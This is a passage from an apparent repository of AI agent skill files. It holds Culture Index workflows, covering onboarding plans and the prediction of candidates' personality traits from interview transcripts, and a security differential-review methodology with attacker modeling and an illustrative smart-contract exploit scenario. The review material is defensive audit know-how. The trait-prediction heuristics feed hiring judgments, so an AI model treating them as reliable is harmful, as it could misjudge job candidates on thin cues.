target:**\n- Day 30: [milestone appropriate for their pattern]\n- Day 45: [milestone appropriate for their pattern]\n- Day 60: [milestone appropriate for their pattern]\n\n**Step 8: Design 60-90 Days**\n\nAt this stage, focus on:\n\n| If New Hire Is... | 60-90 Day Focus |\n|-------------------|-----------------|\n| High A | Expand scope, give ownership of projects |\n| Low A | Establish regular collaboration patterns |\n| High B | Integrate into team social fabric, culture building |\n| Low B | Ensure solo time is protected, deep work established |\n| High C | Consistent routines established, predictable workflow |\n| Low C | Multiple concurrent projects, varied work |\n| High D | Mastery of key processes, becoming the expert |\n| Low D | Creative challenges, problem-solving opportunities |\n\n**Success indicators by Day 90:**\n- [ ] [Indicator appropriate for their pattern]\n- [ ] [Indicator appropriate for their pattern]\n- [ ] [Indicator appropriate for their pattern]\n\n**Step 9: Prepare Manager Briefing**\n\nCreate a one-page briefing for the manager:\n\n```markdown\n## Onboarding Briefing: [New Hire Name]\n\n**Start Date:** [Date]\n**Pattern:** [Archetype]\n\n### Key Traits to Understand\n| Trait | Position | What It Means |\n|-------|----------|---------------|\n| [Leading trait] | [High/Low] | [one-line implication] |\n| [Second trait] | [High/Low] | [one-line implication] |\n\n### Communication Style\n- **Prefer:** [based on traits]\n- **Avoid:** [based on traits]\n- **Feedback:** [how to deliver based on A/D]\n\n### What Motivates Them\n1. [Motivator based on profile]\n2. [Motivator based on profile]\n\n### Potential Friction Areas\n- With [team member]: [friction source and mitigation]\n\n### Recommended Buddy\n[Name] - [reason for pairing]\n\n### First Week Priorities\n1. [Priority based on their traits]\n2. [Priority based on their traits]\n3. [Priority based on their traits]\n\n### Red Flags to Watch\n- [Signal that they're struggling, based on profile]\n- [Signal that they're struggling, based on profile]\n```\n\n**Step 10: Compile Full Onboarding Plan**\n\n```markdown\n## Onboarding Plan: [New Hire Name]\n\n**Prepared:** [Date]\n**Start Date:** [Start Date]\n**Role:** [Title]\n**Manager:** [Manager Name]\n\n### Profile Summary\n- **Pattern:** [Archetype]\n- **Key Traits:** [Top 2-3 trait positions]\n- **EU:** [Survey value]\n\n### Team Integration\n\n**Natural Allies:**\n- [Name] - [reason]\n\n**Potential Friction:**\n- [Name] - [source and mitigation]\n\n**Recommended Buddy:** [Name]\n\n### Manager Adjustments\n1. [Adjustment based on trait gap]\n2. [Adjustment based on trait gap]\n\n### First 90 Days\n\n**Week 1:**\n- [Specific action]\n- [Specific action]\n\n**Days 8-30:**\n- [Focus area]\n- [Focus area]\n\n**Days 30-60:**\n- [Focus area]\n- [Focus area]\n\n**Days 60-90:**\n- [Focus area]\n- [Focus area]\n\n### Success Indicators\n- Day 30: [indicator]\n- Day 60: [indicator]\n- Day 90: [indicator]\n\n### Communication Preferences\n- **Style:** [based on traits]\n- **Frequency:** [based on C and B]\n- **Format:** [based on traits]\n\n### Motivators\n1. [Primary motivator]\n2. [Secondary motivator]\n\n### Watch Areas\n- [Signal they're struggling]\n- [Common challenge for this pattern]\n\n### Notes\n- [Any prediction vs actual differences]\n- [Any special considerations]\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these onboarding mistakes:\n\n- **One-size-fits-all onboarding**: Adjust approach based on their traits\n- **Ignoring manager compatibility**: Manager adjustments are critical for retention\n- **Assigning random buddies**: Match based on profile compatibility\n- **Over-socializing Low B's**: Respect their need for alone time\n- **Under-socializing High B's**: Include them quickly or they'll feel excluded\n- **Rushing High C's**: Give them time to settle into routines\n- **Boring Low C's**: Keep them engaged with variety\n- **Surprising High D's**: Provide structure and documentation\n\n</anti_patterns>\n\n<success_criteria>\n\nOnboarding plan is complete when:\n- [ ] New hire profile loaded and analyzed\n- [ ] Predicted vs actual comparison noted (if applicable)\n- [ ] All team profiles loaded\n- [ ] Natural allies identified with buddy recommendation\n- [ ] Friction points flagged with mitigations\n- [ ] Manager compatibility assessed with adjustments\n- [ ] First 30 days designed based on traits\n- [ ] 30-60 day plan created\n- [ ] 60-90 day plan created\n- [ ] Manager briefing prepared\n- [ ] Success indicators defined\n- [ ] Watch areas documented\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/predict-from-interview.md": "<required_reading>\n\n**Read these reference files before analyzing:**\n1. `references/interview-trait-signals.md` - Behavioral signals for each trait\n2. `references/primary-traits.md` - A, B, C, D trait details\n3. `references/secondary-traits.md` - L, I trait details\n4. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<purpose>\n\nPredict Culture Index traits from interview transcripts. This workflow is used when:\n- Candidates have been interviewed but haven't taken the CI survey yet\n- You want preliminary trait estimates before extending an offer\n- You want to compare predicted vs actual CI (after offer is signed)\n\n**Important:** This produces predictions, not diagnoses. The actual CI survey will be administered after an offer is signed and before the start date.\n\n</purpose>\n\n<process>\n\n**Step 1: Load the Transcript**\n\nRequest the interview transcript. Ideal format includes:\n- Interviewer questions clearly marked\n- Candidate responses clearly marked\n- Timestamps or durations (helpful but not required)\n- Multiple interviews if available (more data = higher confidence)\n\n**Step 2: Initial Read-Through**\n\nFirst pass - get overall impression:\n- How does the candidate communicate?\n- What's their energy level?\n- What topics engage them most?\n- What's their default communication style?\n\nNote your initial gut sense before detailed analysis.\n\n**Step 3: Analyze A (Autonomy) Signals**\n\nSearch transcript for:\n\n| Look For | High A | Low A |\n|----------|--------|-------|\n| Pronouns | \"I decided\", \"I built\" | \"We decided\", \"Our team\" |\n| Credit | Takes personal credit | Deflects to team |\n| Questions | Reframes, pushes back | Asks for clarification |\n| Initiative | Acted without being asked | Waited for direction |\n| Tone | Assertive, confident | Tentative, collaborative |\n\n**Record:**\n- Position: High / Low / Normative\n- Confidence: High / Medium / Low\n- Key quotes (2-3 examples)\n\n**Step 4: Analyze B (Social) Signals**\n\nSearch transcript for:\n\n| Look For | High B | Low B |\n|----------|--------|-------|\n| Rapport | Builds connection, asks about interviewer | Gets straight to business |\n| Stories | People-centric narratives | Task-centric descriptions |\n| Responses | Verbose, talks through thinking | Brief, direct answers |\n| Energy | Animated, expressive | Reserved, measured |\n| Culture questions | Asks about team, social activities | Asks about work, tools |\n\n**Record:**\n- Position: High / Low / Normative\n- Confidence: High / Medium / Low\n- Key quotes (2-3 examples)\n\n**Step 5: Analyze C (Pace) Signals**\n\nSearch transcript for:\n\n| Look For | High C | Low C |\n|----------|--------|-------|\n| Response speed | Pauses, thinks before answering | Rapid responses |\n| Structure | Methodical, sequential | Topic-jumps, tangents |\n| Ambiguity | Asks for clarification | Comfortable with unknowns |\n| Change | Prefers stability | Thrives with pivots |\n| Detail | One topic at a time | Multi-threads |\n\n**Record:**\n- Position: High / Low / Normative\n- Confidence: High / Medium / Low\n- Key quotes (2-3 examples)\n\n**Step 6: Analyze D (Conformity) Signals**\n\nSearch transcript for:\n\n| Look For | High D | Low D |\n|----------|--------|-------|\n| Precision | Specific numbers, dates | Approximations, ranges |\n| Process | References rules, best practices | Describes creative approaches |\n| Answers | Structured, follows question format | Free-flowing, interpretive |\n| Quality | Mentions checking work, standards | Mentions outcomes, results |\n| Flexibility | Follows structure | Challenges premises |\n\n**Record:**\n- Position: High / Low / Normative\n- Confidence: High / Medium / Low\n- Key quotes (2-3 examples)\n\n**Step 7: Analyze L (Logic) - Absolute Scale**\n\nSearch transcript for:\n\n| Look For | High L (8-10) | Low L (0-2) |\n|----------|---------------|-------------|\n| Framing | Data-driven, analytical | Values-driven, emotional |\n| Language | \"The numbers showed...\" | \"It felt right...\" |\n| Difficult topics | Emotion-neutral | Empathetic, emotional |\n| Decision-making | Evidence-based | Intuition-based |\n\n**Record:**\n- Score estimate: 0-10\n- Confidence: High / Medium / Low\n- Key quotes (1-2 examples)\n\n**Step 8: Analyze I (Ingenuity) - Absolute Scale**\n\nSearch transcript for:\n\n| Look For | High I (7-10) | Low I (0-2) |\n|----------|---------------|-------------|\n| Problem-solving | Novel approaches | Proven methods |\n| Assumptions | Questions, challenges | Accepts, follows |\n| Examples | Original, creative | Standard, textbook |\n| Routine | Mentions boredom | Describes comfort |\n\n**Record:**\n- Score estimate: 0-10\n- Confidence: High / Medium / Low\n- Key quotes (1-2 examples)\n\n**Step 9: Identify Pattern**\n\nBased on trait positions, identify likely pattern:\n\nCross-reference with `references/patterns-archetypes.md`:\n\n| If you see... | Likely pattern |\n|---------------|----------------|\n| High A, Low B, Low C, Low D | Architect/Visionary |\n| High A, High B, Low C | Rainmaker/Persuader |\n| Low A, Low B, High C, High D | Scholar/Specialist |\n| Low A, High B, High C | Accommodator |\n| Low A, Low B, Low C, High D | Technical Expert |\n\n**Only identify pattern if confidence is sufficient** - if traits are unclear, note \"insufficient data for pattern identification.\"\n\n**Step 10: Flag Uncertainty Areas**\n\nDocument where evidence is weak:\n- Traits with only 1-2 data points\n- Traits that showed inconsistent signals\n- Topics that weren't covered in interview\n- Signs of \"interview mode\" performance\n\n**Step 11: Generate Predicted Profile**\n\nOutput using this structure:\n\n```markdown\n## Predicted Culture Index Profile: [Candidate Name]\n\n**Analysis Date:** [Date]\n**Transcript Source:** [Interview type, duration, interviewers]\n**Overall Confidence:** [High/Medium/Low]\n\n### Trait Predictions\n\n| Trait | Predicted | Confidence | Evidence |\n|-------|-----------|------------|----------|\n| A (Autonomy) | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| B (Social) | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| C (Pace) | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| D (Conformity) | [High/Low/Norm] | [H/M/L] | \"[Quote]\" |\n| L (Logic) | [0-10] | [H/M/L] | \"[Quote]\" |\n| I (Ingenuity) | [0-10] | [H/M/L] | \"[Quote]\" |\n\n### Predicted Pattern\n**[Pattern Name]** (if identifiable)\n\n[1-2 sentence description of what this pattern means]\n\n### Strongest Signals\n1. [Most clear trait signal with quote]\n2. [Second clearest signal with quote]\n\n### Uncertainty Areas\n- [Trait/area where more data needed]\n- [Trait/area where signals were mixed]\n\n### Interview Context Notes\n- [Any factors that may have affected behavior]\n- [Signs of interview performance mode]\n\n### Caveats\n- This is a prediction based on interview behavior, not a CI survey result\n- Interview stress may affect natural behavior patterns\n- Actual CI survey will be administered after offer acceptance\n- Use for preliminary assessment only - do not treat as definitive\n```\n\n</process>\n\n<verification>\n\nBefore finalizing prediction:\n\n1. **Did I cite specific quotes?** Every trait prediction needs evidence\n2. **Did I note confidence levels?** Every trait needs H/M/L confidence\n3. **Did I flag uncertainties?** Where is evidence weak?\n4. **Did I include caveats?** Predictions are not diagnoses\n5. **Did I avoid over-confidence?** Especially for low-data traits\n\n</verification>\n\n<anti_patterns>\n\nAvoid these prediction mistakes:\n\n- **Over-interpreting single quotes**: One example isn't a pattern\n- **Ignoring interview context**: Stress affects behavior\n- **Treating predictions as definitive**: This is hypothesis, not diagnosis\n- **Skipping low-confidence traits**: Better to say \"uncertain\" than guess\n- **Assuming consistency**: Interview behavior may differ from daily behavior\n- **Forgetting to cite evidence**: Every claim needs a quote\n\n</anti_patterns>\n\n<success_criteria>\n\nTranscript analysis is complete when:\n- [ ] All 6 traits analyzed with position/score estimates\n- [ ] Each trait has confidence level (H/M/L)\n- [ ] Each trait has supporting quotes from transcript\n- [ ] Pattern identified (if sufficient confidence)\n- [ ] Uncertainty areas documented\n- [ ] Caveats clearly stated\n- [ ] Output follows standard format\n\n</success_criteria>\n",
        "plugins/differential-review/.claude-plugin/plugin.json": "{\n  \"name\": \"differential-review\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Security-focused differential review of code changes with git history analysis and blast radius estimation\",\n  \"author\": {\n    \"name\": \"Omar Inuwa\",\n    \"email\": \"opensource@trailofbits.com\",\n    \"url\": \"https://github.com/trailofbits\"\n  }\n}\n",
        "plugins/differential-review/README.md": "# Differential Review\n\nSecurity-focused differential review of code changes with git history analysis and blast radius estimation.\n\n**Author:** Omar Inuwa\n\n## When to Use\n\nUse this skill when you need to:\n- Review PRs, commits, or diffs for security vulnerabilities\n- Detect security regressions (re-introduced vulnerabilities)\n- Analyze the blast radius of code changes\n- Check test coverage gaps for modified code\n\n## What It Does\n\nThis skill performs comprehensive security review of code changes:\n\n- **Risk-First Analysis** - Prioritizes auth, crypto, value transfer, external calls\n- **Git History Analysis** - Uses blame to understand why code existed and detect regressions\n- **Blast Radius Calculation** - Quantifies impact by counting callers\n- **Test Coverage Gaps** - Identifies untested changes\n- **Adaptive Depth** - Scales analysis based on codebase size (small/medium/large)\n\n## Installation\n\n```\n/plugin install trailofbits/skills/plugins/differential-review\n```\n\n## Documentation Structure\n\nThis skill uses a **modular documentation architecture** for token efficiency and progressive disclosure:\n\n### Core Entry Point\n- **[SKILL.md](skills/differential-review/SKILL.md)** - Main entry point (217 lines)\n  - Quick reference tables for triage\n  - Decision tree routing to detailed docs\n  - Quality checklist and red flags\n  - Integration with other skills\n\n### Supporting Documentation\n- **[methodology.md](skills/differential-review/methodology.md)** - Detailed phase-by-phase workflow (~200 lines)\n  - Pre-Analysis: Baseline context building\n  - Phase 0: Intake & Triage\n  - Phase 1: Changed Code Analysis\n  - Phase 2: Test Coverage Analysis\n  - Phase 3: Blast Radius Analysis\n  - Phase 4: Deep Context Analysis\n\n- **[adversarial.md](skills/differential-review/adversarial.md)** - Attacker modeling and exploit scenarios (~150 lines)\n  - Phase 5: Adversarial Vulnerability Analysis\n  - Attacker model definition (WHO/ACCESS/INTERFACE)\n  - Exploitability rating framework\n  - Complete exploit scenario templates\n\n- **[reporting.md](skills/differential-review/reporting.md)** - Report structure and formatting (~120 lines)\n  - Phase 6: Report Generation\n  - 9-section report template\n  - Formatting guidelines and conventions\n  - File naming and notification templates\n\n- **[patterns.md](skills/differential-review/patterns.md)** - Common vulnerability patterns (~80 lines)\n  - Security regressions detection\n  - Reentrancy, access control, overflow patterns\n  - Quick detection bash commands\n\n### Benefits of This Structure\n- **Token Efficient** - Load only the documentation you need\n- **Progressive Disclosure** - Quick reference for triage, detailed docs for deep analysis\n- **Maintainable** - Each concern separated into its own file\n- **Navigable** - Decision tree routes you to the right document\n\n## Workflow\n\nThe complete workflow spans Pre-Analysis + Phases 0-6:\n\n1. **Pre-Analysis** - Build baseline context with `audit-context-building` skill (if available)\n2. **Phase 0: Intake** - Extract changes, assess size, risk-score files\n3. **Phase 1: Changed Code** - Analyze diffs, git blame, check for regressions\n4. **Phase 2: Test Coverage** - Identify coverage gaps\n5. **Phase 3: Blast Radius** - Calculate impact of changes\n6. **Phase 4: Deep Context** - Five Whys root cause analysis\n7. **Phase 5: Adversarial Analysis** - Hunt vulnerabilities with attacker model\n8. **Phase 6: Report** - Generate comprehensive markdown report\n\n**Navigation:** Use the decision tree in SKILL.md to jump directly to the phase you need.\n\n## Output\n\nGenerates a markdown report with:\n- Executive summary with severity distribution\n- Critical findings with attack scenarios and PoCs\n- Test coverage analysis\n- Blast radius analysis\n- Historical context and regression risks\n- Actionable recommendations\n\n## Example Usage\n\n```\nReview the security implications of this PR:\ngit diff main..feature/auth-changes\n```\n\n## Related Skills\n\n- `context-building` - Used for baseline context analysis\n- `issue-writer` - Transform findings into formal audit reports\n",
        "plugins/differential-review/commands/diff-review.md": "---\nname: trailofbits:diff-review\ndescription: Performs security-focused differential review of code changes\nargument-hint: \"<pr-url|commit-sha|diff-path> [--baseline <ref>]\"\nallowed-tools:\n  - Read\n  - Write\n  - Grep\n  - Glob\n  - Bash\n---\n\n# Differential Security Review\n\n**Arguments:** $ARGUMENTS\n\nParse arguments:\n1. **Target** (required): PR URL, commit SHA, or diff path\n2. **Baseline** (optional): `--baseline <ref>` for comparison reference\n\nInvoke the `differential-review` skill with these arguments for the full workflow.\n",
        "plugins/differential-review/skills/differential-review/SKILL.md": "---\nname: differential-review\ndescription: >\n  Performs security-focused differential review of code changes (PRs, commits, diffs).\n  Adapts analysis depth to codebase size, uses git history for context, calculates\n  blast radius, checks test coverage, and generates comprehensive markdown reports.\n  Automatically detects and prevents security regressions.\nallowed-tools:\n  - Read\n  - Write\n  - Grep\n  - Glob\n  - Bash\n---\n\n# Differential Security Review\n\nSecurity-focused code review for PRs, commits, and diffs.\n\n## Core Principles\n\n1. **Risk-First**: Focus on auth, crypto, value transfer, external calls\n2. **Evidence-Based**: Every finding backed by git history, line numbers, attack scenarios\n3. **Adaptive**: Scale to codebase size (SMALL/MEDIUM/LARGE)\n4. **Honest**: Explicitly state coverage limits and confidence level\n5. **Output-Driven**: Always generate comprehensive markdown report file\n\n---\n\n## Rationalizations (Do Not Skip)\n\n| Rationalization | Why It's Wrong | Required Action |\n|-----------------|----------------|-----------------|\n| \"Small PR, quick review\" | Heartbleed was 2 lines | Classify by RISK, not size |\n| \"I know this codebase\" | Familiarity breeds blind spots | Build explicit baseline context |\n| \"Git history takes too long\" | History reveals regressions | Never skip Phase 1 |\n| \"Blast radius is obvious\" | You'll miss transitive callers | Calculate quantitatively |\n| \"No tests = not my problem\" | Missing tests = elevated risk rating | Flag in report, elevate severity |\n| \"Just a refactor, no security impact\" | Refactors break invariants | Analyze as HIGH until proven LOW |\n| \"I'll explain verbally\" | No artifact = findings lost | Always write report |\n\n---\n\n## Quick Reference\n\n### Codebase Size Strategy\n\n| Codebase Size | Strategy | Approach |\n|---------------|----------|----------|\n| SMALL (<20 files) | DEEP | Read all deps, full git blame |\n| MEDIUM (20-200) | FOCUSED | 1-hop deps, priority files |\n| LARGE (200+) | SURGICAL | Critical paths only |\n\n### Risk Level Triggers\n\n| Risk Level | Triggers |\n|------------|----------|\n| HIGH | Auth, crypto, external calls, value transfer, validation removal |\n| MEDIUM | Business logic, state changes, new public APIs |\n| LOW | Comments, tests, UI, logging |\n\n---\n\n## Workflow Overview\n\n```\nPre-Analysis  Phase 0: Triage  Phase 1: Code Analysis  Phase 2: Test Coverage\n                                                              \nPhase 3: Blast Radius  Phase 4: Deep Context  Phase 5: Adversarial  Phase 6: Report\n```\n\n---\n\n## Decision Tree\n\n**Starting a review?**\n\n```\n Need detailed phase-by-phase methodology?\n   Read: methodology.md\n     (Pre-Analysis + Phases 0-4: triage, code analysis, test coverage, blast radius)\n\n Analyzing HIGH RISK change?\n   Read: adversarial.md\n     (Phase 5: Attacker modeling, exploit scenarios, exploitability rating)\n\n Writing the final report?\n   Read: reporting.md\n     (Phase 6: Report structure, templates, formatting guidelines)\n\n Looking for specific vulnerability patterns?\n   Read: patterns.md\n     (Regressions, reentrancy, access control, overflow, etc.)\n\n Quick triage only?\n    Use Quick Reference above, skip detailed docs\n```\n\n---\n\n## Quality Checklist\n\nBefore delivering:\n\n- [ ] All changed files analyzed\n- [ ] Git blame on removed security code\n- [ ] Blast radius calculated for HIGH risk\n- [ ] Attack scenarios are concrete (not generic)\n- [ ] Findings reference specific line numbers + commits\n- [ ] Report file generated\n- [ ] User notified with summary\n\n---\n\n## Integration\n\n**audit-context-building skill:**\n- Pre-Analysis: Build baseline context\n- Phase 4: Deep context on HIGH RISK changes\n\n**issue-writer skill:**\n- Transform findings into formal audit reports\n- Command: `issue-writer --input DIFFERENTIAL_REVIEW_REPORT.md --format audit-report`\n\n---\n\n## Example Usage\n\n### Quick Triage (Small PR)\n```\nInput: 5 file PR, 2 HIGH RISK files\nStrategy: Use Quick Reference\n1. Classify risk level per file (2 HIGH, 3 LOW)\n2. Focus on 2 HIGH files only\n3. Git blame removed code\n4. Generate minimal report\nTime: ~30 minutes\n```\n\n### Standard Review (Medium Codebase)\n```\nInput: 80 files, 12 HIGH RISK changes\nStrategy: FOCUSED (see methodology.md)\n1. Full workflow on HIGH RISK files\n2. Surface scan on MEDIUM\n3. Skip LOW risk files\n4. Complete report with all sections\nTime: ~3-4 hours\n```\n\n### Deep Audit (Large, Critical Change)\n```\nInput: 450 files, auth system rewrite\nStrategy: SURGICAL + audit-context-building\n1. Baseline context with audit-context-building\n2. Deep analysis on auth changes only\n3. Blast radius analysis\n4. Adversarial modeling\n5. Comprehensive report\nTime: ~6-8 hours\n```\n\n---\n\n## When NOT to Use This Skill\n\n- **Greenfield code** (no baseline to compare)\n- **Documentation-only changes** (no security impact)\n- **Formatting/linting** (cosmetic changes)\n- **User explicitly requests quick summary only** (they accept risk)\n\nFor these cases, use standard code review instead.\n\n---\n\n## Red Flags (Stop and Investigate)\n\n**Immediate escalation triggers:**\n- Removed code from \"security\", \"CVE\", or \"fix\" commits\n- Access control modifiers removed (onlyOwner, internal  external)\n- Validation removed without replacement\n- External calls added without checks\n- High blast radius (50+ callers) + HIGH risk change\n\nThese patterns require adversarial analysis even in quick triage.\n\n---\n\n## Tips for Best Results\n\n**Do:**\n- Start with git blame for removed code\n- Calculate blast radius early to prioritize\n- Generate concrete attack scenarios\n- Reference specific line numbers and commits\n- Be honest about coverage limitations\n- Always generate the output file\n\n**Don't:**\n- Skip git history analysis\n- Make generic findings without evidence\n- Claim full analysis when time-limited\n- Forget to check test coverage\n- Miss high blast radius changes\n- Output report only to chat (file required)\n\n---\n\n## Supporting Documentation\n\n- **[methodology.md](methodology.md)** - Detailed phase-by-phase workflow (Phases 0-4)\n- **[adversarial.md](adversarial.md)** - Attacker modeling and exploit scenarios (Phase 5)\n- **[reporting.md](reporting.md)** - Report structure and formatting (Phase 6)\n- **[patterns.md](patterns.md)** - Common vulnerability patterns reference\n\n---\n\n**For first-time users:** Start with [methodology.md](methodology.md) to understand the complete workflow.\n\n**For experienced users:** Use this page's Quick Reference and Decision Tree to navigate directly to needed content.\n",
        "plugins/differential-review/skills/differential-review/adversarial.md": "# Adversarial Vulnerability Analysis (Phase 5)\n\nStructured methodology for finding vulnerabilities through attacker modeling.\n\n**When to use:** After completing deep context analysis (Phase 4), apply this to all HIGH RISK changes.\n\n---\n\n## 1. Define Specific Attacker Model\n\n**WHO is the attacker?**\n- Unauthenticated external user\n- Authenticated regular user\n- Malicious administrator\n- Compromised contract/service\n- Front-runner/MEV bot\n\n**WHAT access/privileges do they have?**\n- Public API access only\n- Authenticated user role\n- Specific permissions/tokens\n- Contract call capabilities\n\n**WHERE do they interact with the system?**\n- Specific HTTP endpoints\n- Smart contract functions\n- RPC interfaces\n- External APIs\n\n---\n\n## 2. Identify Concrete Attack Vectors\n\n```\nENTRY POINT: [Exact function/endpoint attacker can access]\n\nATTACK SEQUENCE:\n1. [Specific API call/transaction with parameters]\n2. [How this reaches the vulnerable code]\n3. [What happens in the vulnerable code]\n4. [Impact achieved]\n\nPROOF OF ACCESSIBILITY:\n- Show the function is public/external\n- Demonstrate attacker has required permissions\n- Prove attack path exists through actual interfaces\n```\n\n---\n\n## 3. Rate Realistic Exploitability\n\n**EASY:** Exploitable via public APIs with no special privileges\n- Single transaction/call\n- Common user access level\n- No complex conditions required\n\n**MEDIUM:** Requires specific conditions or elevated privileges\n- Multiple steps or timing requirements\n- Elevated but obtainable privileges\n- Specific system state needed\n\n**HARD:** Requires privileged access or rare conditions\n- Admin/owner privileges needed\n- Rare edge case conditions\n- Significant resources required\n\n---\n\n## 4. Build Complete Exploit Scenario\n\n```\nATTACKER STARTING POSITION:\n[What the attacker has at the beginning]\n\nSTEP-BY-STEP EXPLOITATION:\nStep 1: [Concrete action through accessible interface]\n  - Command: [Exact call/request]\n  - Parameters: [Specific values]\n  - Expected result: [What happens]\n\nStep 2: [Next action]\n  - Command: [Exact call/request]\n  - Why this works: [Reference to code change]\n  - System state change: [What changed]\n\nStep 3: [Final impact]\n  - Result: [Concrete harm achieved]\n  - Evidence: [How to verify impact]\n\nCONCRETE IMPACT:\n[Specific, measurable impact - not \"could cause issues\"]\n- Exact amount of funds drained\n- Specific privileges escalated\n- Particular data exposed\n```\n\n---\n\n## 5. Cross-Reference with Baseline Context\n\nFrom baseline analysis (see [methodology.md](methodology.md#pre-analysis-baseline-context-building)), check:\n- Does this violate a system-wide invariant?\n- Does this break a trust boundary?\n- Does this bypass a validation pattern?\n- Is this a regression of a previous fix?\n\n---\n\n## Vulnerability Report Template\n\nGenerate this for each finding:\n\n```markdown\n## [SEVERITY] Vulnerability Title\n\n**Attacker Model:**\n- WHO: [Specific attacker type]\n- ACCESS: [Exact privileges]\n- INTERFACE: [Specific entry point]\n\n**Attack Vector:**\n[Step-by-step exploit through accessible interfaces]\n\n**Exploitability:** EASY/MEDIUM/HARD\n**Justification:** [Why this rating]\n\n**Concrete Impact:**\n[Specific, measurable harm - not theoretical]\n\n**Proof of Concept:**\n```code\n// Exact code to reproduce\n```\n\n**Root Cause:**\n[Reference specific code change at file.sol:L123]\n\n**Blast Radius:** [N callers affected]\n**Baseline Violation:** [Which invariant/pattern broken]\n```\n\n---\n\n## Example: Complete Adversarial Analysis\n\n**Change:** Removed `require(amount > 0)` check from `withdraw()` function\n\n### 1. Attacker Model\n- **WHO:** Unauthenticated external user\n- **ACCESS:** Can call public contract functions\n- **INTERFACE:** `withdraw(uint256 amount)` at 0x1234...\n\n### 2. Attack Vector\n**ENTRY POINT:** `withdraw(0)`\n\n**ATTACK SEQUENCE:**\n1. Call `withdraw(0)` from attacker address\n2. Code bypasses amount check (removed)\n3. Withdraw event emitted with 0 amount\n4. Accounting updated incorrectly\n\n**PROOF:** Function is `external`, no auth required\n\n### 3. Exploitability\n**RATING:** EASY\n- Single transaction\n- Public function\n- No special state required\n\n### 4. Exploit Scenario\n**ATTACKER POSITION:** Has user account with 0 balance\n\n**EXPLOITATION:**\n```solidity\nStep 1: attacker.withdraw(0)\n  - Passes removed validation\n  - Emits Withdraw(user, 0)\n  - Updates withdrawnAmount[user] += 0\n\nStep 2: Off-chain indexer sees Withdraw event\n  - Credits attacker for 0 withdrawal\n  - But accounting thinks withdrawal happened\n\nStep 3: Accounting mismatch exploited\n  - Total supply decremented\n  - User balance not changed\n  - System invariants broken\n```\n\n**IMPACT:**\n- Protocol accounting corrupted\n- Can be used to manipulate LP calculations\n- Estimated $50K impact on pool prices\n\n### 5. Baseline Violation\n- Violates invariant: \"All withdrawals must transfer non-zero value\"\n- Breaks validation pattern: Amount checks present in all other value transfers\n- Regression: Check added in commit abc123 \"Fix zero-amount exploit\"\n\n---\n\n**Next:** Document all findings in final report (see [reporting.md](reporting.md))\n",
        "plugins/differential-review/skills/differential-review/methodology.md": "# Differential Review Methodology\n\nDetailed phase-by-phase workflow for security-focused code review.\n\n## Pre-Analysis: Baseline Context Building\n\n**FIRST ACTION - Build complete baseline understanding:**\n\nIf `audit-context-building` skill is available:\n\n```bash\n# Checkout baseline commit\ngit checkout <baseline_commit>\n\n# Invoke audit-context-building skill on baseline codebase\n# Scope = entire relevant project (e.g., packages/contracts/contracts/ for Solidity, src/ for Rust, etc.)\naudit-context-building --scope [entire project or main contract directory] --focus invariants,trust-boundaries,validation-patterns,call-graphs,state-flows\n\n# Examples:\n# For Solidity: audit-context-building --scope packages/contracts/contracts\n# For Rust: audit-context-building --scope src\n# For full repo: audit-context-building --scope .\n```\n\n**Capture from baseline analysis:**\n- System-wide invariants (what must ALWAYS be true across all code)\n- Trust boundaries and privilege levels (who can do what)\n- Validation patterns (what gets checked where - defense-in-depth)\n- Complete call graphs for critical functions (who calls what)\n- State flow diagrams (how state changes)\n- External dependencies and trust assumptions\n\n**Why this matters:**\n- Understand what the code was SUPPOSED to do before changes\n- Identify implicit security assumptions in baseline\n- Detect when changes violate baseline invariants\n- Know which patterns are system-wide vs local\n- Catch when changes break defense-in-depth\n\n**Store baseline context for reference during differential analysis.**\n\nAfter baseline analysis, checkout back to head commit to analyze changes.\n\n---\n\n## Phase 0: Intake & Triage\n\n**Extract changes:**\n```bash\n# For commit range\ngit diff <base>..<head> --stat\ngit log <base>..<head> --oneline\n\n# For PR\ngh pr view <number> --json files,additions,deletions\n\n# Get all changed files\ngit diff <base>..<head> --name-only\n```\n\n**Assess codebase size:**\n```bash\nfind . -name \"*.sol\" -o -name \"*.rs\" -o -name \"*.go\" -o -name \"*.ts\" | wc -l\n```\n\n**Classify complexity:**\n- **SMALL**: <20 files  Deep analysis (read all deps)\n- **MEDIUM**: 20-200 files  Focused analysis (1-hop deps)\n- **LARGE**: 200+ files  Surgical (critical paths only)\n\n**Risk score each file:**\n- **HIGH**: Auth, crypto, external calls, value transfer, validation removal\n- **MEDIUM**: Business logic, state changes, new public APIs\n- **LOW**: Comments, tests, UI, logging\n\n---\n\n## Phase 1: Changed Code Analysis\n\nFor each changed file:\n\n1. **Read both versions** (baseline and changed)\n\n2. **Analyze each diff region:**\n   ```\n   BEFORE: [exact code]\n   AFTER: [exact code]\n   CHANGE: [behavioral impact]\n   SECURITY: [implications]\n   ```\n\n3. **Git blame removed code:**\n   ```bash\n   # When was it added? Why?\n   git log -S \"removed_code\" --all --oneline\n   git blame <baseline> -- file.sol | grep \"pattern\"\n   ```\n\n   **Red flags:**\n   - Removed code from \"fix\", \"security\", \"CVE\" commits  CRITICAL\n   - Recently added (<1 month) then removed  HIGH\n\n4. **Check for regressions (re-added code):**\n   ```bash\n   git log -S \"added_code\" --all -p\n   ```\n\n   Pattern: Code added  removed for security  re-added now = REGRESSION\n\n5. **Micro-adversarial analysis** for each change:\n   - What attack did removed code prevent?\n   - What new surface does new code expose?\n   - Can modified logic be bypassed?\n   - Are checks weaker? Edge cases covered?\n\n6. **Generate concrete attack scenarios:**\n   ```\n   SCENARIO: [attack goal]\n   PRECONDITIONS: [required state]\n   STEPS:\n     1. [specific action]\n     2. [expected outcome]\n     3. [exploitation]\n   WHY IT WORKS: [reference code change]\n   IMPACT: [severity + scope]\n   ```\n\n---\n\n## Phase 2: Test Coverage Analysis\n\n**Identify coverage gaps:**\n```bash\n# Production code changes (exclude tests)\ngit diff <range> --name-only | grep -v \"test\"\n\n# Test changes\ngit diff <range> --name-only | grep \"test\"\n\n# For each changed function, search for tests\ngrep -r \"test.*functionName\" test/ --include=\"*.sol\" --include=\"*.js\"\n```\n\n**Risk elevation rules:**\n- NEW function + NO tests  Elevate risk 